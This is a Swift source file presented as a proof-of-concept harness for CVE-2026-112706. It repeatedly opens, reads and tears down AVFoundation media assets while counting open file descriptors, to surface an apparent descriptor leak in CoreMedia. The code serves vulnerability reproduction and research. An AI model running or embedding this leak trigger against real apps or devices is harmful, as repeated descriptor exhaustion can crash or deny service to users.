import Foundation
import CoreMedia
import AVFoundation

/// PoC harness for CVE-2026-112706.
/// Repeatedly opens/closes media assets and sample-buffer pipelines
/// to surface an FD leak in CoreMedia's descriptor handling.
final class CoreMediaPoC {

    enum PoCError: Error {
        case noSampleFile
    }

    private let bundleAssetName: String
    private let bundleAssetExtension: String

    init(bundleAssetName: String = "sample", bundleAssetExtension: String = "mov") {
        self.bundleAssetName = bundleAssetName
        self.bundleAssetExtension = bundleAssetExtension
    }

    /// Number of currently open file descriptors for this process.
    static func openFDCount() -> Int {
        (try? FileManager.default.contentsOfDirectory(atPath: "/dev/fd").count) ?? -1
    }

    /// Loads the bundled sample into a temp path so CoreMedia can mmap it.
    private func materializeAsset() throws -> URL {
        guard let url = Bundle.main.url(forResource: bundleAssetName, withExtension: bundleAssetExtension) else {
            throw PoCError.noSampleFile
        }
        let tmp = FileManager.default.temporaryDirectory
            .appendingPathComponent(UUID().uuidString)
            .appendingPathExtension(bundleAssetExtension)
        try FileManager.default.copyItem(at: url, to: tmp)
        return tmp
    }

    /// Single iteration: open asset, walk tracks, build a reader,
    /// drop references without an explicit teardown, then unlink.
    private func iterate(assetURL: URL) async throws {
        let asset = AVURLAsset(url: assetURL, options: [
            AVURLAssetPreferPreciseDurationAndTimingKey: true
        ])

        _ = try await asset.load(.tracks)
        _ = try await asset.load(.duration)

        let reader = try AVAssetReader(asset: asset)
        for track in asset.tracks {
            guard track.mediaType == .video || track.mediaType == .audio else { continue }
            let output = AVAssetReaderTrackOutput(
                track: track,
                outputSettings: [
                    kCVPixelBufferPixelFormatTypeKey as String: kCVPixelFormatType_32BGRA
                ]
            )
            if reader.canAdd(output) { reader.add(output) }
        }
        reader.startReading()

        // Drain a few buffers to force CoreMedia to touch its internal FDs.
        if let first = reader.outputs.first as? AVAssetReaderTrackOutput {
            for _ in 0..<8 {
                _ = first.copyNextSampleBuffer()
            }
        }

        reader.cancelReading()
        try? FileManager.default.removeItem(at: assetURL)
    }

    /// Runs `iterations` cycles and reports FD delta.
    func run(iterations: Int,
             onProgress: @escaping (Int, Int) -> Void) async throws -> (baseline: Int, final: Int) {
        let baseline = Self.openFDCount()
        for i in 0..<iterations {
            let url = try materializeAsset()
            try await iterate(assetURL: url)
            onProgress(i + 1, Self.openFDCount())
        }
        let final = Self.openFDCount()
        return (baseline, final)
    }
}
